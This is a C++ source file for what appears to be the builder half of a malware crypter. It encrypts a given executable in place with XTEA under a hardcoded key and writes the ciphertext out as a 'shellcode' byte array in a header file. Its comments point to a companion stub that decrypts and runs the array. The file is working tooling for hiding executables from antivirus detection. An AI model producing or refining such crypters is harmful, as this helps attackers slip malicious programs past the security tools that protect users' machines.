#include <iostream>
#include <fstream>
#include <stdint.h>
#include <cstring>
#include <cstdlib>
#include <stdlib.h>
using namespace std;

unsigned int key[4]={0xACB6,0x1344,0xEC90,0x285C};  /* Chose a password in hex   */
#define BLOCK_SIZE 8                               /* Make sure you change both */
                                                  /* xtea.cpp and stub.cpp     */
/*
    XTea reference code taken from
    http://en.wikipedia.org/wiki/XTEA
*/
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9;
    for (i=0; i < num_rounds; i++){
        v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
        sum += delta;
        v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
    }
    v[0]=v0; v[1]=v1;
}

void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){
     unsigned int i;
     uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
     for (i=0; i < num_rounds; i++){
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
     }
     v[0]=v0; v[1]=v1;
}

void crypto(char filepath[] ,bool cipher){
      fstream dat(filepath,ios::in | ios::out | ios::binary); //Open the file
      if(!dat){
        cout << "I can not read from the file you provided. Sorry :\(" << endl;
        system("pause");
        exit(-1);
      }

      unsigned size;

      dat.seekg(0,ios::end);
      size=dat.tellg();
      dat.seekg(ios::beg);

      dat.clear();

      unsigned pos;

      int n_blocks=size/BLOCK_SIZE;
      if(size%BLOCK_SIZE!=0)
          ++n_blocks;

      for(int i=0;i<n_blocks;i++){ //for every character in the executable, encipher the character
          unsigned char data[BLOCK_SIZE];
          pos=dat.tellg();

          dat.read((char*)data,BLOCK_SIZE);

          if(cipher) encipher(32,(uint32_t*)data,key);
          else decipher(32,(uint32_t*)data,key);

          dat.seekp(pos);
          dat.write((char*)data,BLOCK_SIZE);

          memset(data,0,BLOCK_SIZE);
      }
      dat.close(); //all the enciphered data was sent back the the executable
}

int shellcode(std::string file){
    FILE *sf; //executable file
    FILE *f; //shellcode.h
    int i, c;
    char *arr_name;
    sf = fopen(file.c_str(), "rb");
    if (sf == NULL) {
        fprintf(stderr, "fopen(%s) Failed. Could'nt open file.", file.c_str());
        return 1;
    }
    arr_name = "shellcode";
    f = fopen("shellcode.h","w");
    fprintf(f, "unsigned char %s[] = {", arr_name);

    for (i=0;;i++) {                        //grab the shellcode and drop it in
        if ((c = fgetc(sf)) == EOF) break; //shellcode.h
        if (i != 0) fprintf(f,",");
        if ((i % 12) == 0) fprintf(f,"\n\t");
        fprintf(f,"0x%.2X", (unsigned char)c);
    }

    fprintf(f,"\n\t};\n");

	fprintf(f,"unsigned int size = %i;\n", i);

    fclose(sf);
    fclose(f);
    return 0;
}

int main(int argc, char *argv[]){
    if (argc < 2) { //RTFM
        fprintf(stderr, "Usage: %s [filepath]\n", argv[0]);
        return 1;
    }
    crypto(argv[1], true); //cipher
    cout << "Finished Ciphering " << argv[1] << endl;
    shellcode(argv[1]); //generate shellcode
    cout << "Finished Generating" << argv[1] << endl;
    system("pause"); //press any key to continue
    return 0;
}
